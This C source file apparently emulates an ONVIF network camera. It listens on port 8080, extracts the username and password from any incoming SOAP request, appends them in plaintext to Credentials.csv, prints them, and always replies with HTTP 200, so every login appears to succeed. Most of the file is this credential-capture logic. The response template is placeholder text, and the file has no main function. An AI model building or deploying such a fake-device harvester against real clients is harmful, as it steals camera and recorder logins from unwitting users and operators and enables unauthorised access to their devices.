#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define DISCOVERY_PORT 3702
#define MULTICAST_ADDR "239.255.255.250"
#define CAMERA_HTTP_PORT 8080
#define BUFFER_SIZE 65536
#define AUTH_PORT 8080
#define MAX_CREDENTIALS 1024

const char *auth_template =
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
    "xmlns:tds=\"http://www.onvif.org/ver10/device/wsdl\">"
    "<s:Body>"
    "<tds:GetCapabilitiesResponse>"
    "this will be sent as an experimental this will be sent after confirmation "
    "of existance of user and passwd "
    "for the onvif test tool and whatever is required in static state not ptz"
    "</tds:GetCapabilitiesResponse>"
    "</s:Body>"
    "</s:Envelope>";

void extract_username(const char *msg, char *out, size_t out_size);
void extract_username(const char *msg, char *out, size_t out_size) {
  out[0] = '\0';
  const char *start = strstr(msg, "Username>");
  if (!start)
    return;
  start += 9; // skip "Username>"

  const char *end = strstr(start, "</");
  if (!end)
    return;

  size_t len = end - start;
  if (len >= out_size)
    len = out_size - 1;
  memcpy(out, start, len);
  out[len] = '\0';
}

void extract_passwd(const char *msg, char *out, size_t out_size);
void extract_passwd(const char *msg, char *out, size_t out_size) {
  out[0] = '\0';
  const char *start = strstr(msg, "<wsse:Password");
  if (!start)
    start = strstr(msg, "<Password");
  if (!start)
    return;

  start = strchr(start, '>');
  if (!start)
    return;
  start++;

  const char *end = strstr(start, "</wsse:Password>");
  if (!end)
    end = strstr(start, "</Password>");
  if (!end)
    return;

  size_t len = end - start;
  if (len >= out_size)
    len = out_size - 1;
  memcpy(out, start, len);
  out[len] = '\0';
}

void *authentication(void *arg) {
  (void)arg;
  printf("Auth server started on port %d\n", AUTH_PORT);

  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0)
    return NULL;

  int opt = 1;
  setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

  struct sockaddr_in addr = {0};
  addr.sin_family = AF_INET;
  addr.sin_port = htons(AUTH_PORT);
  addr.sin_addr.s_addr = INADDR_ANY;

  if (bind(sock, (struct sockaddr *)&addr, sizeof(addr))) {
    perror("bind");
  }
  listen(sock, 5);

  char buf[BUFFER_SIZE];
  char user[MAX_CREDENTIALS] = {0};
  char pass[MAX_CREDENTIALS] = {0};

  while (1) {
    struct sockaddr_in cl;
    socklen_t clen = sizeof(cl);
    int cs = accept(sock, (struct sockaddr *)&cl, &clen);
    if (cs < 0)
      continue;

    ssize_t n = recv(cs, buf, sizeof(buf) - 1, 0);
    if (n > 0) {
      buf[n] = '\0';

      extract_username(buf, user, sizeof(user));
      extract_passwd(buf, pass, sizeof(pass));

      // Write to CSV
      FILE *f = fopen("Credentials.csv", "a");
      if (f) {
        fprintf(f, "%s,%s\n", user, pass);
        fclose(f);
      }
      printf("Got user: %s   pass: %s\n", user, pass);
    }

    // Always reply 200 
    const char *resp = "HTTP/1.1 200 OK\r\n"
                       "Content-Type: text/xml\r\n"
                       "Content-Length: 0\r\n\r\n";
    send(cs, resp, strlen(resp), 0);
    close(cs);
  }

  close(sock);
  return NULL;
}